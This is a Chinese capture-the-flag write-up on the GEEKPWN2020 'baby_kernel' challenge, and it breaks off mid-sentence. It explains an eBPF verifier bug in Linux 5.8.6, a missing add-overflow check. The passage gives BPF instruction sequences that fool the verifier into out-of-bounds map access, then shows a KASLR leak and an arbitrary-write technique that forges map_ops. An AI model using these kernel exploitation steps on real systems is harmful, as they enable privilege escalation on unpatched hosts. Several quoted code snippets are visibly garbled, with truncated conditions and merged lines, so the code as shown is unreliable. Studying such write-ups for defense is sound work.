# GEEKPWN2020-云安全挑战赛决赛-baby_kernel题解
## 前言
上周参加了酷炫的GEEKPWN大会，比赛时未能解出这道题目，因为是bpf相关的洞，之前也有一点了解，赛后七哥不厌其烦地给我指导，最终成功解出，非常感谢`sunichi`师傅的帮助。本文相关文件在[这里](https://github.com/xmzyshypnc/xz_files)
## 漏洞挖掘
附件里贴心地给了source源码和linux-5.8.6的源码，我们拿`beyond
compare`比较一下两个项目文件夹，可以找到不同的文件，拿vscode比较一下具体地文件，即可看到`diff`的结果.可以看到在`verifier.c`文件中的`scalar_min_max_add`函数中缺失了溢出检查。
具体看一下此处的代码和调用,只跟到`check_alu_op`就差不多了，因为之前我们分析bpf漏洞的时候知道核心检查函数`do_check`中会调用此函数。因此最后的漏洞调用链为：`do_check`->`check_alu_op`->`adjust_reg_min_max_vals`->`adjust_scalar_min_max_vals`->`scalar_min_max_add`。
    //verifier.c
    static int adjust_scalar_min_max_vals(struct bpf_verifier_env *env,
                          struct bpf_insn *insn,
                          struct bpf_reg_state *dst_reg,
                          struct bpf_reg_state src_reg)
    {
        switch (opcode) {
        case BPF_ADD:
            ret = sanitize_val_alu(env, insn);
            if (ret var_off = tnum_add(dst_reg->var_off, src_reg.var_off);
            break;
            //...
        }
    }
    //
    static int adjust_reg_min_max_vals(struct bpf_verifier_env *env,
                       struct bpf_insn *insn)
    {
        //...
        return adjust_scalar_min_max_vals(env, insn, dst_reg, *src_reg);
    }
    //
    /* check validity of 32-bit and 64-bit arithmetic operations */
    static int check_alu_op(struct bpf_verifier_env *env, struct bpf_insn *insn)
    {
        //...
        else {  /* all other ALU ops: and, sub, xor, add, ... */
            if (BPF_SRC(insn->code) == BPF_X) {
                if (insn->imm != 0 || insn->off != 0) {
                    verbose(env, "BPF_ALU uses reserved fields\n");
                    return -EINVAL;
                }
                /* check src1 operand */
                err = check_reg_arg(env, insn->src_reg, SRC_OP);
                if (err)
                    return err;
            } else {
                if (insn->src_reg != BPF_REG_0 || insn->off != 0) {
                    verbose(env, "BPF_ALU uses reserved fields\n");
                    return -EINVAL;
                }
            }
            /* check src2 operand */
            err = check_reg_arg(env, insn->dst_reg, SRC_OP);
            if (err)
                return err;
            if ((opcode == BPF_MOD || opcode == BPF_DIV) &&
                BPF_SRC(insn->code) == BPF_K && insn->imm == 0) {
                verbose(env, "div by zero\n");
                return -EINVAL;
            }
            if ((opcode == BPF_LSH || opcode == BPF_RSH ||
                 opcode == BPF_ARSH) && BPF_SRC(insn->code) == BPF_K) {
                int size = BPF_CLASS(insn->code) == BPF_ALU64 ? 64 : 32;
                if (insn->imm imm >= size) {
                    verbose(env, "invalid shift %d\n", insn->imm);
                    return -EINVAL;
                }
            }
            /* check dest operand */
            err = check_reg_arg(env, insn->dst_reg, DST_OP_NO_MARK);
            if (err)
                return err;
            return adjust_reg_min_max_vals(env, insn);
        }
    }
    static bool signed_add_overflows(s64 a, s64 b)
    {
        /* Do the add in u64, where overflow is well-defined */
        s64 res = (s64)((u64)a + (u64)b);
        if (b  a;
        return res >1`被认为是0，而实际上我们传入n=2，即可得到1，再进行`BPF_MUL`计算从而造成越界读写。
借鉴上述漏洞的想法，我们把`verifier`作为一个vm的检查，要执行的数据先拿进去检查一遍，在检查过程中`smin_val`和`smax_val`会进行检查和更新，其范围表示verifier认为的某个寄存器输入的范围。假如我们可以通过一些手段欺骗其认为寄存器范围是一个常数C，后面再通过一些计算(移位，乘除)使寄存器范围变为常数0.而0乘除任何数字都是0，而实际可以传入非零值得到其他值，这就可以帮助我们进行map的越界读写。
那么这个洞要怎么达到上述效果呢？比赛的时候我一直在尝试用`BPF_ALU64_IMM`来进行调整，使其`smin_val==smax_val==0`，然而发现要使得`a+x==b+x(mod
0x10000000000000000)`，除非a本身==b+0x10000000000000000。这条路并不可行，在参考文章里的核心越界指令是`BPF_LDX_MEM(BPF_DW,0,7,0)`，其中r7被越界改为&map_addr-0x110，我们看下`BPF_LDX_MEM`这个指令的检查条件，其核心检查函数为`__check_mem_access`。可以看到`off`需要大于等于0，因此我们必须trick使得`smin_val==smax_val==0`。
    //verifier.c
    /* check read/write into memory region (e.g., map value, ringbuf sample, etc) */
    static int __check_mem_access(struct bpf_verifier_env *env, int regno,
                      int off, int size, u32 mem_size,
                      bool zero_size_allowed)
    {
        bool size_ok = size > 0 || (size == 0 && zero_size_allowed);
        struct bpf_reg_state *reg;
        if (off >= 0 && size_ok && (u64)off + size type) {
        case PTR_TO_MAP_VALUE:
            verbose(env, "invalid access to map value, value_size=%d off=%d size=%d\n",
                mem_size, off, size);
            break;
        case PTR_TO_PACKET:
        case PTR_TO_PACKET_META:
        case PTR_TO_PACKET_END:
            verbose(env, "invalid access to packet, off=%d size=%d, R%d(id=%d,off=%d,r=%d)\n",
                off, size, regno, reg->id, off, mem_size);
            break;
        case PTR_TO_MEM:
        default:
            verbose(env, "invalid access to memory, mem_size=%u off=%d size=%d\n",
                mem_size, off, size);
        }
        return -EACCES;
    }
赛后17师傅提示说可以使用`BPF_ALU64_REG`来达到我们的目的，我们先来看下`smin_val`和`smax_val`的初始值`S64_MIN`和`S64_MAX`。其值分别为`0x8000000000000000`和`0x7fffffffffffffff`。我们来看下面的一组bpf指令。根据其初始值可以看到r8的smin和smax分别经历了`0x8000000000000000->0x8000000000000001->0x4000000000000000->0x8000000000000000->0`以及`0x7fffffffffffffff->0x8000000000000000->0x4000000000000000->0x8000000000000000->0`的变化，最终smin==smax==0，这是verifier做出的判断。然而如果我们输入`r8==0x100000000`，满足开始的smin和smax条件，实际计算出来的结果确是`0x100000000->0x100000001->0x80000000->0x100000000->0x200000000->2->0x110`。二者结果不一致，我们可以绕过检查进行越界读写。
    BPF_ALU64_IMM(BPF_ADD,8,1),     //r8 += 1
        BPF_ALU64_IMM(BPF_RSH,8,1),     //r8 >> 1
        BPF_ALU64_IMM(BPF_LSH,8,1),     //r8 >= 32
        BPF_ALU64_IMM(BPF_MUL,8,0x110/2), //r8 *= 0x110
### 地址泄露
任意读和参考文章的做法一致，我们看下核心的数据结构`bpf_array`，其中的value字段对应我们输入map的地址，其-0x110的偏移处保存着`array_map_ops`字段，它是一个全局的变量，存储在vmlinux内核文件的data段，通过它可以leak出kaslr的基址，通过`wait_list->next`可以泄露出map的地址。在`de4dcr0w`师傅的文章中，其构造了任意读来获取cred的地址，这里因为我没有起root
shell所以就只泄露了这两个地址。
    gef➤  p/a *(struct bpf_array*) 0xffff888005840000
    $1 = {
      map = {
        ops = 0xffffffff82016880 ,
        inner_map_meta = 0x0 ,
        security = 0xffff88800679df00,
        map_type = 0x2 ,
        key_size = 0x4 ,
        value_size = 0x2000 ,
        max_entries = 0x1 ,
        map_flags = 0x0 ,
        spin_lock_off = 0xffffffffffffffea,
        id = 0x4 ,
        numa_node = 0xffffffffffffffff,
        btf_key_type_id = 0x0 ,
        btf_value_type_id = 0x0 ,
        btf = 0x0 ,
        memory = {
          pages = 0x3 ,
          user = 0xffff8880067de300
        },
        name = {0x0  },
        btf_vmlinux_value_type_id = 0x0 ,
        bypass_spec_v1 = 0x0 ,
        frozen = 0x0 ,
        refcnt = {
          counter = 0x2 
        },
        usercnt = {
          counter = 0x1 
        },
        work = {
          data = {
            counter = 0x0 
          },
          entry = {
            next = 0x0 ,
            prev = 0x0 
          },
          func = 0x0 
        },
        freeze_mutex = {
          owner = {
            counter = 0x0 
          },
          wait_lock = {
            {
              rlock = {
                raw_lock = {
                  {
                    val = {
                      counter = 0x0 
                    },
                    {
                      locked = 0x0 ,
                      pending = 0x0 
                    },
                    {
                      locked_pending = 0x0 ,
                      tail = 0x0 
                    }
                  }
                }
              }
            }
          },
          osq = {
            tail = {
              counter = 0x0 
            }
          },
          wait_list = {
            next = 0xffff8880058400c0,
            prev = 0xffff8880058400c0
          }
        },
        writecnt = 0x0 
      },
      elem_size = 0x2000 ,
      index_mask = 0x0 ,
      aux = 0x0 ,
      {
        value = 0xffff888005840110,//这里是map_element的地址
        ptrs = 0xffff888005840110,
        pptrs = 0xffff888005840110
      }
    }
### 任意地址写
任意地址写的利用链依然是参照`rtfingc`师傅的做法，首先看一下`array_map_ops`成员，我们可以通过地址越界写覆写array_map_ops成员为`map_element_addr`，从而伪造map_ops。
    gef➤  p/a *(struct bpf_map_ops *) 0xffffffff82016880
    $2 = {
      map_alloc_check = 0xffffffff81162ef0 ,
      map_alloc = 0xffffffff81163df0 ,
      map_release = 0x0 ,
      map_free = 0xffffffff811636c0 ,
      map_get_next_key = 0xffffffff81162fe0 ,
      map_release_uref = 0x0 ,
      map_lookup_elem_sys_only = 0x0 ,
      map_lookup_batch = 0xffffffff81149240 ,
      map_lookup_and_delete_batch = 0x0 ,
      map_update_batch = 0xffffffff81149020 ,
      map_delete_batch = 0x0 ,
      map_lookup_elem = 0xffffffff81163060 ,
      map_update_elem = 0xffffffff811635b0 ,
      map_delete_elem = 0xffffffff81163010 ,
      map_push_elem = 0x0 ,
      map_pop_elem = 0x0 ,
      map_peek_elem = 0x0 ,
      map_fd_get_ptr = 0x0 ,
      map_fd_put_ptr = 0x0 ,
      map_gen_lookup = 0xffffffff81163310 ,
      map_fd_sys_lookup_elem = 0x0 ,
      map_seq_show_elem = 0xffffffff81163140 ,
      map_check_btf = 0xffffffff81163c60 ,
      map_poke_track = 0x0 ,
      map_poke_untrack = 0x0 ,
      map_poke_run = 0x0 ,
      map_direct_value_addr = 0xffffffff81162f70 ,
      map_direct_value_meta = 0xffffffff81162fa0 ,
      map_mmap = 0xffffffff811630e0 ,
      map_poll = 0x0 
    }
我们将`map_push_elem`改为`map_get_next_key`，在调用`map_update_elem`的时候会调用`map_push_elem`，但是需要map的类型为`BPF_MAP_TYPE_QUEUE`或者`BPF_MAP_TYPE_STACK`。
看一下调用链，map_update_elem函数中的`bpf_map_update_value(map, f, key, value,
attr->flags);`调用bpf_map_update_value函数的`map->ops->map_push_elem(map, value,
flags);`，最终调用了`array_map_get_next_key(struct bpf_map *map, void *key, void
*next_key)`。其中`key`对应`value`，`next_key`对应`attr->flags`。
最终当`index map.max_entries`时，有`*next = index +
1;`，即`*(attr->flags)=*(u32